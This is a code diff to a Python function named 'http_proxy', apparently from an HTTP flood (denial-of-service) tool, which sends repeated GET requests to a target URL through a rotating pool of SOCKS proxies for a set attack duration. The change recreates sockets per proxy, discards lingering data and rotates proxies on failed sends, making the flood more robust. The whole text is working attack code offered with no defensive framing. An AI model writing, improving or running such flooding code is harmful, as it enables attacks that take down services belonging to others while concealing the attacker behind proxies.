@@ -271,15 +271,6 @@ def http_proxy(worker_id, proto, target_url, attack_duration, useragent, referer
     host = urlparse(target_url).netloc
     port = 443 if target_url.startswith('https://') else 80
 
-    s = socks.socksocket()
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.setsockopt(socket.SOL_SOCKET, socket.TCP_NODELAY, 1)
-    s.settimeout(4)
-
-    if port == 443: # ssl
-        ctx = ssl.SSLContext()
-        s = ctx.wrap_socket(s,server_hostname=host)
-
     stoptime = time.time() + attack_duration
     while time.time() < stoptime and Core.attackrunning:
         try:
@@ -287,20 +278,36 @@ def http_proxy(worker_id, proto, target_url, attack_duration, useragent, referer
             errcount = 0 # reset counter
             proxip, proxport = choice(Core.proxy_pool).split(':')
 
+            # (re)create socket
+            s = socks.socksocket()
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.setsockopt(socket.SOL_SOCKET, socket.TCP_NODELAY, 1)
+            s.setsockopt(socket.SOL_SOCKET, socket.SOL_LINGER,1,0) # throws way any data when the connection closes
+            s.settimeout(4)
+
+            s.set_proxy(proto, str(proxip), int(proxport))
+            s.connect( (host, int(port) ))
+
+            if port == 443: # ssl
+                ctx = ssl.SSLContext()
+                s = ctx.wrap_socket(s,server_hostname=host)
+
+            # build packet
+            headers = ''.join([f'{key}: {value}\r\n' for key,value in buildheaders(target_url, useragent, referer).items()])
+            packet = f'GET /{buildblock("/")} HTTP/{Core.http_version}\r\nHost: {host}:{str(port)}\r\n{headers}\r\n'.encode()
+
             while Core.attackrunning:
                 if errcount >= 40:
                     Core.proxy_pool.delete(f'{proxip}:{proxport}'); break
 
                 try:
-                    s.set_proxy(proto, proxip, int(proxport))
-                    s.connect( (host, int(port) ))
                     for _ in range(100):
                         try:
-                            # build packet
-                            headers = ''.join([f'{key}: {value}\r\n' for key,value in buildheaders(target_url, useragent, referer).items()])
-                            packet = f'GET /{buildblock("/")} HTTP/{Core.http_version}\r\nHost: {host}:{str(port)}\r\n{headers}\r\n'.encode()
+                            sent = s.send( packet )
+                            if not sent:
+                                proxip, proxport = choice(Core.proxy_pool).split(':')
+                                s.set_proxy(proto, str(proxip), int(proxport)) # rotate proxy
 
-                            s.send( packet )
 
                             Core.infodict[worker_id]['req_sent'] += 1
                         except:
@@ -310,7 +317,7 @@ def http_proxy(worker_id, proto, target_url, attack_duration, useragent, referer
 
                 except Exception:
                     errcount+1
-
+            s.close()
         except Exception:
             s.close()
             Core.infodict[worker_id]['req_fail'] += 1
